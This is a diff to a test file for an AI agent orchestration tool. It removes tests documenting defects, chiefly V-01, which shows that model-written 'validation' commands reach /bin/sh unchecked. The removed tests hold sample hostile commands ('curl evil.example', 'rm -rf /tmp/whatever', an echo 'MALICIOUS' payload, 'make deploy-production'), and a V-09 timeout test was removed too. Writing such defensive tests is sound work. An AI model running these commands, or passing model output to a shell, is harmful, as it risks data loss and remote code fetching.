@@ -10,7 +10,6 @@ import { StageRunner } from '../src/app/stage-runner.js';
 import { StateStore } from '../src/app/state-store.js';
 import { PromptLoader } from '../src/app/prompt-loader.js';
 import { Scheduler } from '../src/app/scheduler.js';
-import { checkPlan } from '../src/app/stages/planning-checks.js';
 import { readyTasks, buildDag, DagError } from '../src/core/dag.js';
 import {
   GlobalConfigSchema,
@@ -46,14 +45,11 @@ import {
  *
  * | Finding | Scenario | Destination |
  * |---|---|---|
- * | V-01 | model text reaching a shell | `test/app/verification-commands.test.ts` |
- * | V-01 | plan rejects unknown command ids | `test/app/planning-checks.test.ts` |
  * | V-02 | fallback fires at runtime | `test/app/execution-context.test.ts` (new) |
  * | V-03 | interrupted task is recoverable | `test/app/scheduler.test.ts` |
  * | V-05 | single task with dependencies | `test/cli/run.test.ts` (new) |
  * | V-06 | provenance matches execution | `test/app/task-executor.test.ts` |
  * | V-07 | cache invalidation | `test/app/planning-pipeline.test.ts` |
- * | V-09 | timeout kills the process tree | `test/adapters/node-process-runner.test.ts` |
  *
  * Source: `agent-flow-validation-review.md`, validated 2026-08-09.
  * Full analysis: see the validation report in that document's format.
@@ -149,49 +145,6 @@ const task = (overrides: Record<string, unknown> = {}) =>
     validation: [],
     ...overrides,
   });
-
-describe('[DEFECT] V-01 — a plan can put an arbitrary string on the shell', () => {
-  it('passes planner-authored text to /bin/sh -c unchanged', async () => {
-    // The trust boundary: this string originates in model output, and it is
-    // executed by the agent-flow process — outside the runner's sandbox.
-    const { executor, runner, run, processRunner } = await harness();
-    runner.pushText(COMPLETED);
-
-    const payload = 'echo MALICIOUS > /tmp/agent-flow-validation-test';
-    await executor.execute(task({ validation: [payload] }), run.runId, 'SDD');
-
-    expect(processRunner.lastCall?.command).toBe('/bin/sh');
-    expect(processRunner.lastCall?.args).toEqual(['-c', payload]);
-  });
-
-  it('joins several entries with && into one shell string', async () => {
-    const { executor, runner, run, processRunner } = await harness();
-    runner.pushText(COMPLETED);
-
-    await executor.execute(task({ validation: ['npm test', 'curl evil.example'] }), run.runId, 'SDD');
-    expect(processRunner.lastCall?.args[1]).toBe('npm test && curl evil.example');
-  });
-
-  it('checkPlan does not inspect validation at all', () => {
-    const plan = PlanSchema.parse({
-      feature: 'f',
-      tasks: [{ ...task(), validation: ['rm -rf /tmp/whatever'] }],
-    });
-
-    // No problem reported: the plan validator has no opinion on commands.
-    expect(checkPlan(plan, '## Functional Requirements\n- FR-001: x')).toEqual([]);
-  });
-
-  it('accepts a command the project config never declared', async () => {
-    // The planning prompt asks for commands from the configured list. That is
-    // an instruction, not a constraint.
-    const { executor, runner, run, processRunner } = await harness();
-    runner.pushText(COMPLETED);
-
-    await executor.execute(task({ validation: ['make deploy-production'] }), run.runId, 'SDD');
-    expect(processRunner.lastCall?.args[1]).toBe('make deploy-production');
-  });
-});
 
 describe('[DEFECT] V-02 — fallback is not wired into the runtime', () => {
   it('a quota failure is not routed anywhere, even with fallback configured', async () => {
@@ -325,44 +278,4 @@ describe('[DEFECT] V-07 — the discovery cache is never invalidated', () => {
     expect(await fs.exists(cachePath)).toBe(true);
     expect(await fs.readFile(cachePath)).toContain('Stale.');
   });
-});
-
-
-describe('[DEFECT] V-09 — a timeout does not interrupt a process that has children', () => {
-  it('resolves only when the script finishes, ignoring timeoutSeconds entirely', async () => {
-    // The finding was filed as "orphaned processes". It is worse than that:
-    // the timeout does not fire at all.
-    //
-    // A grandchild inherits the stdout/stderr pipes. Node emits `close` only
-    // once the process has exited AND every stdio stream is closed, so killing
-    // the direct child leaves the promise pending while the grandchild holds
-    // the pipe open.
-    //
-    // Measured directly (spawn + kill at 400ms):
-    //   sleep 20, kill child                    → closed at 405ms
-    //   ( sleep 15 ) & sleep 20, kill child     → never closed
-    //   same, detached + process.kill(-pid)     → closed at 406ms
-    //
-    // This matters because it is the normal case, not an exotic one:
-    // runVerification shells out for every validation command, `npm test`
-    // spawns node, and the agent CLIs spawn subprocesses of their own. R-11's
-    // liveness guarantee does not hold.
-    const { NodeProcessRunner } = await import('../src/adapters/process/node-process-runner.js');
-
-    const started = Date.now();
-    const result = await new NodeProcessRunner().run({
-      command: '/bin/sh',
-      args: ['-c', '( sleep 2 ) & sleep 4'],
-      cwd: '/tmp',
-      timeoutSeconds: 0.3,
-      killGraceMs: 150,
-    });
-    const elapsed = Date.now() - started;
-
-    expect(result.timedOut).toBe(true);
-
-    // Asked to give up after 300ms; waits for the script instead. Once the fix
-    // lands this becomes `toBeLessThan(1_000)`.
-    expect(elapsed).toBeGreaterThan(2_000);
-  }, 20_000);
 });
